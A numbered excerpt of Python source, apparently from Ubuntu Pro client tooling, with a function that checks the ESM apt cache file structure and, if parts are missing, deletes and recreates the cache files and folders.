   891	def _ensure_esm_cache_structure():
   892	    # make sure all necessary files exist...
   893	    existing_files = glob.glob(
   894	        os.path.join(ESM_APT_ROOTDIR, "**/*"), recursive=True
   895	    )
   896	    desired_files = (
   897	        ESM_BASIC_FILE_STRUCTURE["files"] + ESM_BASIC_FILE_STRUCTURE["folders"]
   898	    )
   899	    if all((file in existing_files for file in desired_files)):
   900	        return
   901	
   902	    # ...otherwise make sure they do NOT exist...
   903	    system.ensure_folder_absent(ESM_APT_ROOTDIR)
   904	
   905	    # ...and recreate them
   906	    for file in ESM_BASIC_FILE_STRUCTURE["files"]:
   907	        system.create_file(file)
   908	    for folder in ESM_BASIC_FILE_STRUCTURE["folders"]:
   909	        os.makedirs(folder, exist_ok=True, mode=0o755)
   910	
